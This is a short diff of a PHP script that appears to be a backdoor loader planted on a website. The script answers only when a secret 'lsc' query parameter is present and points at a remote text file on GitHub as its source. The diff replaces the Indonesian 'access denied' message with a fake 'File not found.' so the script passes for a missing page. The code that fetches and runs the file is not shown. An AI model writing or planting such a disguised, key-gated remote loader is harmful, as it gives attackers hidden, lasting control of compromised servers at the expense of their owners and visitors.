@@ -1,6 +1,6 @@
 <?php
 if (!isset($_GET['lsc'])) {
-    die('Akses ditolak');
+    die('File not found.');
 }
 
 $url = 'https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/gekopw.txt';
